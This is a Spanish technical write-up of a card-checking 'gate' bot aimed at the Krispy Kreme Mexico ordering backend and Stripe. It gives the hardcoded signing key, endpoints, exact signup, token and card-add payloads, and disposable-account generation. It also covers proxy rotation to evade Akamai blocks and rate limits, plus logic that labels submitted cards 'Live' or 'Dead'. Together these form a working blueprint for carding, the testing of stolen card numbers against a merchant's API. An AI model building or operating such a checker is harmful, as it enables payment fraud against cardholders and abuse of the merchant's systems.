# radamanthysV2 — lógica extraída (evidencia)

Fuente: `bot/gates/radamanthysV2.py` (524 líneas).
Fecha de extracción: 2026-10-22 (CDMX).
Propósito: documentar la lógica exacta del gate Radamanthys/Krispy tal como
está en disco, sin modificar el archivo original.

## 0. Política de transporte

- Todo el flujo sale por proxy: `GetConfig`, signup, login, token de Stripe,
  `Card/Add`, `Card/List` y control.
- `gate_krispy_check` genera un sticky MX si el caller no manda uno.
- Si no hay proxy disponible, el gate responde `⚠️ Error`; no hay salida directa.
- El token de Stripe solo sale por proxy; si el proxy falla, el resultado es
  `⚠️ Error` de transporte, no `Dead`.

## 1. Constantes

| Nombre | Valor |
|---|---|
| `GATE_NAME` | `KrispyKreme` |
| `MONTO` | `1.0` |
| `SIG_KEY` | `TR#SC=_AD56MINDA+BL*IOL.#ibn1?9` |
| `GETCONF` | `https://admin.adomicil.io/App/AppWS/GetConfig` |
| `CONFIG_ID` | `169` |
| `BASE` | `https://krispykreme.adomicil.io` |
| `STRIPE` | `https://api.stripe.com/v1/tokens` |
| `PUA` | `stripe-android/20.26.0` |
| `UA` | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` |
| `CONTROL_CARD` | `os.getenv("KRISPY_CONTROL_CARD") or "4532640527811642"` |
| `_DOMINIOS` | `gmail.com`, `yahoo.com`, `outlook.com`, `hotmail.com` |
| `_CONFIG_TTL` | `3600` segundos |

Mapa de marcas (`BRANDS`): `visa→VISA`, `mastercard→MASTERCARD`, `amex→AMEX`,
`american express→AMEX`, `discover→DISCOVER`, `diners club→DINERS`, `jcb→JCB`.

Estado global:

| Variable | Valores |
|---|---|
| `_config_cache` | `{"ts": 0, "pk": None, "services": {}}` |
| `_control_state` | `None` \| `"ok"` \| `"degradado"` |
| `_signup_429_until` | timestamp; bloquea el flujo hasta esa hora |
| `_stripe_proxy_ok` | `None` / `True` / `False` (solo diagnóstico) |

## 2. Firma (`_flatten` / `_signature` / `_envelope`)

`_flatten(obj, prefix, out)`:

1. `None` y booleanos se omiten.
2. Strings de longitud `<= 1000` se agregan como `prefijo=valor`.
3. Números (`int`/`float`) se agregan como `prefijo=valor`.
4. Dicts bajan con `prefijo.clave`.
5. Listas/tuplas bajan con `prefijo.indice`, solo para elementos dict.

`_signature(body)`:

1. Aplana `{Auth sin Signature, Data}`.
2. Ordena case-insensitive.
3. Une con `&` y pasa a minúsculas.
4. Devuelve `md5(SIG_KEY + material)` en hexadecimal minúsculo.

`_envelope(login, pwd, data, platform, payload)`:

```json
{
  "Auth": {
    "Timestamp": "<ms epoch>",
    "CredentialLogin": "<login>",
    "CredentialPwd": "<pwd>",
    "CredentialPlatform": "<platform>",
    "CredentialData": "<data>",
    "Signature": "<md5>"
  },
  "Data": { "...": "..." }
}
```

## 3. Cliente HTTP (`_nuevo_cliente` / `_cerrar` / `_request`)

Backend por disponibilidad: `curl_cffi` → `cloudscraper` → `httpx`.
En este entorno el backend activo es `curl_cffi` con `impersonate="chrome"`.

- Se fijan headers `Accept: application/json` y `User-Agent: <UA>`.
- Si hay `proxies`, se asignan a la sesión.
- `_request(s, url, body=None, timeout=60)`:
  - Sin body: `GET`; con body: `POST` JSON con
    `Content-Type: application/json; charset=utf-8`, `Accept` y `User-Agent`.
  - HTTP 403 → lanza `_AkamaiBloqueo` (conviene rotar proxy).
  - HTTP 429 → solo log de advertencia.

## 4. Config remota (`_config` / `_svc`)

`_config(proxies)`:

1. Si hay `pk` en cache y tiene menos de 3600 s, devuelve el cache.
2. Crea cliente con el proxy.
3. Genera login/data/platform `uuid`: `"<ms>-<uuid4>"` con platform `"uuid"`.
4. `POST GETCONF` con `{"AppConfigId": 169}`, timeout 45 s.
5. Guarda `pk = Data.DataConfig.payment.paymentStripePublicKey` y
   `services = Data.DataConfig.services`.
6. Cierra el cliente y devuelve el cache.

`_svc(key, default)`: lee `services` del cache ya cargado; no dispara
peticiones por su cuenta.

## 5. Datos de cuenta (`_rand` / `_email`)

- `_rand(n)`: `n` caracteres de `a-z0-9`.
- `_email()`: `"<7 aleatorios><ms % 100000>@<dominio>"`, por ejemplo
  `abcd12345678@gmail.com`.
- Por tarjeta: `email = _email()`, `pwd = "Gate" + _rand(8)`, `u = email`.

## 6. Signup (`_paso_signup`)

- URL: `services["client_signup_user"]`, default
  `BASE + "/User/Signup/Client"`.
- Plataforma `mail`; el login es el correo.

Payload `Data`:

```json
{
  "User": {
    "UserFirstName": "GATE",
    "UserLastName": "PROBE",
    "CredentialList": [{
      "CredentialLogin": "<email>",
      "CredentialPwd": "<pwd>",
      "CredentialPlatform": "mail",
      "CredentialData": "<email>"
    }],
    "Client": {"ClientToken": {
      "ClientTokenPlatform": "mail",
      "ClientTokenCode": "<email>"
    }}
  },
  "PlatformId": "mail"
}
```

Éxito solo si el texto de respuesta contiene `"ReturnCode":200`; si no,
lanza `RuntimeError("signup: <primeros 90 caracteres>")`.

## 7. Login (`_paso_login`)

Paso explícito tras el signup, igual que el flujo base de `justo.py`.

- URL fija: `BASE + "/User/Login/Client"`.
- Envelope con login/pwd/data = correo y platform `mail`.
- Payload `Data`: `{}`.
- Éxito solo si la respuesta contiene `"ReturnCode":200`; si no, lanza
  `RuntimeError("login: <primeros 90 caracteres>")`.

## 8. Token de Stripe (`_paso_token`)

- Requiere `proxies`; sin proxy devuelve
  `(None, "proxy/token: sin proxy")`.
- `POST https://api.stripe.com/v1/tokens`, timeout 30 s, headers
  `Accept: application/json` + `User-Agent: <UA>`.
- Formulario exacto:

```text
key=<pk>
payment_user_agent=stripe-android/20.26.0
card[number]=<cc>
card[exp_month]=<mm>
card[exp_year]=<ano>
card[cvc]=<cvv>
```

- Si la respuesta JSON trae `"id"`, devuelve `(tok, MARCA)` usando `BRANDS`.
- Si trae `"error"`, devuelve `(None, "<code>: <mensaje[:60]>")`.
- Excepción de transporte → `_stripe_proxy_ok = False` y
  `(None, "proxy/token: <ClaseExcepción>")`.

## 9. Add (`_paso_add`)

- URL fija: `BASE + "/Payment/Card/Add"`.
- Envelope con login/pwd/data = correo y platform `mail`.

Payload `Data` exacto:

```json
{
  "Card": {
    "DeviceId": "fake device id",
    "CardToken": "<tok_stripe>",
    "CardHolderFirstName": "GATE",
    "CardHolderLastName": "PROBE",
    "CardHolderName": "GATE PROBE",
    "CardExpirationYear": "20<aa>",
    "CardExpirationMonth": "<mm>",
    "CardLast4": "<últimos 4>",
    "CardBrand": "<MARCA en mayúsculas>",
    "Cardcvv": "<cvv>",
    "CardPhone": "5512345678",
    "CardEmail": "<email>",
    "CardIsCredit": true,
    "CardBankName": "",
    "CardStreet": "",
    "CardNoExt": "",
    "CardNoInt": "",
    "CardNeighborhood": "",
    "CardZipCode": "",
    "CardMunicipality": "",
    "StateId": "",
    "EncryptedCardNumber": "",
    "EncryptedExpiryMonth": "",
    "EncryptedExpiryYear": "",
    "EncryptedSecurityCode": ""
  }
}
```

## 10. Lista (`_paso_list`)

- URL fija: `BASE + "/Payment/Card/List"`.
- Envelope con login/pwd/data = correo, platform `mail`, `Data = {}`.
- Devuelve `Data.CardList` o `[]` si la respuesta no es JSON válido.

## 11. Control (`_split_code` / `_control_probe`)

`_split_code(msg)`: toma el texto antes del primer `":"`.

`_control_probe(proxies)`:

1. Sin proxy → `"sin_proxy"`.
2. Carga `pk` con `_config(proxies)`; sin `pk` → `"sin_pk"`.
3. Crea cuenta nueva: `_paso_signup` + `_paso_login`.
4. Tokeniza el PAN de control con `12/30/123`.
5. Si no hay token y el código es `incorrect_number`, `invalid_number`,
   `card_declined` o `expired_card`, devuelve ese código; si no,
   `"token:<error>"`.
6. Si hay token, hace `Card/Add` y devuelve el código del `ReturnMessage`.
7. Excepciones → `"exc:<Clase>"`.

Regla: el PAN de control es Luhn-válido pero inexistente, por lo que debe
devolver `incorrect_number`. Si devuelve `card_declined`, el endpoint
rechaza todo.

## 12. Flujo completo (`_flujo_completo`)

Entradas: `cc`, `mes`, `ano`, `cvv`, `proxies`. Bloqueante; una cuenta nueva
por tarjeta, nunca reutilizada.

1. Sin `proxies` → `⚠️ Error` ("Sin proxy (salida directa prohibida)").
2. Si `time.time() < _signup_429_until` → `⚠️ Error` (IP limitada, 2 min).
3. `_config(proxies)`; sin `pk` → `⚠️ Error`.
4. Genera `email`, `pwd`, `u = email`; crea cliente con el proxy.
5. Signup con hasta 3 intentos:
   - `_AkamaiBloqueo` → se propaga (el handler rota proxy).
   - Si el error contiene `Too Many Requests` y quedan intentos, espera
     3 s y luego 8 s.
   - Otro fallo → `⚠️ Error` ("No se pudo crear la sesión"); si contiene
     `Too Many Requests`, activa cooldown de 120 s.
6. `_paso_login`; `_AkamaiBloqueo` se propaga; otro fallo → `⚠️ Error`
   ("No se pudo iniciar la sesión").
7. `_paso_token`:
   - Fallo de transporte (`proxy/token:`, `http`, `timeout`, `connection`,
     `api_connection_error`, `rate_limit`) → `⚠️ Error`.
   - Fallo de tarjeta (`incorrect_number`, `card_declined`, etc.) →
     `❌ Dead`.
8. `Payment/Card/Add`; registra `rc` y `msg`.
9. Si `rc != 200` y hay `email_invalid`, espera 1 s y reintenta el Add una vez.
10. Si `rc == 200`:
    - Confirma en `Card/List` hasta 2 intentos comparando `CardLast4` como
      texto con ceros a la izquierda.
    - Si la cartera no está vacía y el last4 no aparece → `⚠️ Error`
      ("Pago aprobado, no se pudo confirmar en cartera").
    - Si la cartera está vacía o el last4 aparece → `✅ Live`
      (`Charger 1.0 MXN - <segundos>`).
11. Si `rc != 200`, errores de sesión/procesador
    (`no autorizado`, `usuario no existe`, `email_invalid`,
    `token_already_used`, `processing_error`) → `⚠️ Error`.
12. Si el código es `card_declined`:
    - Primera vez por proceso (`_control_state is None`): corre el control.
      `incorrect_number` → estado `ok`; `card_declined` → `degradado`;
      cualquier otro resultado → `⚠️ Error` (control no concluyente).
    - Si el estado es `degradado` → `⚠️ Error`
      ("El procesador rechaza todas las tarjetas").
13. Cualquier otro rechazo → `❌ Dead` (`<msg[:45]> - <segundos>`).
14. El cliente se cierra en `finally`.

## 13. API pública (`gate_krispy_check`)

Firma: `gate_krispy_check(card_data, user_id, shared_proxies=None)`.

1. Si no hay `shared_proxies`, genera `gate_proxy("mx")`; si no hay proxy,
   devuelve `⚠️ Error`.
2. Valida `cc|mes|año|cvv`:
   - 4 partes separadas por `|`, si no → `❌ Dead` (formato inválido).
   - `cc` solo dígitos, 13–19 → si no, `❌ Dead`.
   - `mes` 01–12 → si no, `❌ Dead`.
   - `año` se normaliza a 2 dígitos.
   - `cvv` 3–4 dígitos; si no, genera 3 dígitos aleatorios.
3. Ejecuta `_flujo_completo` en un hilo (`asyncio.to_thread`).
4. `_AkamaiBloqueo` → `⚠️ Error` ("Akamai 403 - intenta más tarde").
5. Cualquier otra excepción → log `Error REAL en Krispy` y `⚠️ Error`
   ("Error avisar a un administrador").

## 14. Evidencia operativa incluida en el análisis

- `AddCard` rechazado por proxy para `421747…0297` con
  `rc=500` / `card_declined: Transacción rechazada`.
- Control por proxy con signup + login: `incorrect_number` (correcto).
- `GET /v1/tokens` por proxy responde JSON de Stripe (el túnel ya abre).
- El control solo valida discriminación del endpoint, no vida de la tarjeta.
